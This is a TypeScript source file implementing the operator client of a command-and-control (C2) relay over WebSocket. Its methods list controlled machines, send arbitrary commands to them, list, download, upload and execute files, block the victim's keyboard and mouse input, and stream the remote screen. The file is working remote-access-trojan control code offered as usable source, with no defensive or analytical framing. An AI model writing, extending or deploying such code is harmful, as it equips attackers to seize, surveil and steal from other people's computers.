import WebSocket from "ws";
import type { IC2RelayClient, C2Event } from "../../../domain/ports/IC2RelayClient.js";

export class C2RelayWsClient implements IC2RelayClient {
  private _ws: WebSocket | null = null;
  private readonly _listeners = new Set<(event: C2Event) => void>();

  isConnected(): boolean {
    return this._ws?.readyState === WebSocket.OPEN;
  }

  async connect(serverUrl: string, token?: string): Promise<void> {
    if (this.isConnected()) return;

    return new Promise<void>((resolve, reject) => {
      const ws = new WebSocket(serverUrl);

      ws.once("open", () => {
        this._ws = ws;
        ws.send(JSON.stringify({ type: "operator", token: token ?? "" }));
        resolve();
      });

      ws.once("error", (err) => reject(err));

      ws.on("message", (raw) => {
        const event = JSON.parse(raw.toString()) as C2Event;
        this._listeners.forEach((l) => l(event));
      });

      ws.on("close", () => {
        this._ws = null;
        this._listeners.forEach((l) =>
          l({ type: "error", error: "connection closed" }),
        );
      });
    });
  }

  disconnect(): void {
    if (this._ws) {
      this._ws.close();
      this._ws = null;
    }
  }

  onEvent(listener: (event: C2Event) => void): () => void {
    this._listeners.add(listener);
    return () => this._listeners.delete(listener);
  }

  listMachines(): void {
    this._send({ type: "list_machines" });
  }

  sendCommand(machineId: string, command: string): void {
    this._send({ type: "cmd", machine_id: machineId, command });
  }

  fileList(machineId: string, path: string): void {
    this._send({ type: "file_list", machine_id: machineId, path });
  }

  fileDownload(machineId: string, path: string): void {
    this._send({ type: "file_download", machine_id: machineId, path });
  }

  fileUpload(machineId: string, path: string, data: string): void {
    this._send({ type: "file_upload", machine_id: machineId, path, data });
  }

  fileExec(machineId: string, path: string): void {
    this._send({ type: "file_exec", machine_id: machineId, path });
  }

  blockInput(machineId: string): void {
    this._send({ type: "block_input", machine_id: machineId });
  }

  unblockInput(machineId: string): void {
    this._send({ type: "unblock_input", machine_id: machineId });
  }

  screenStart(machineId: string, fps: number = 5): void {
    this._send({ type: "screen_start", machine_id: machineId, fps });
  }

  screenStop(machineId: string): void {
    this._send({ type: "screen_stop", machine_id: machineId });
  }

  private _send(msg: Record<string, unknown>): void {
    if (this._ws?.readyState === WebSocket.OPEN) {
      this._ws.send(JSON.stringify(msg));
    }
  }
}

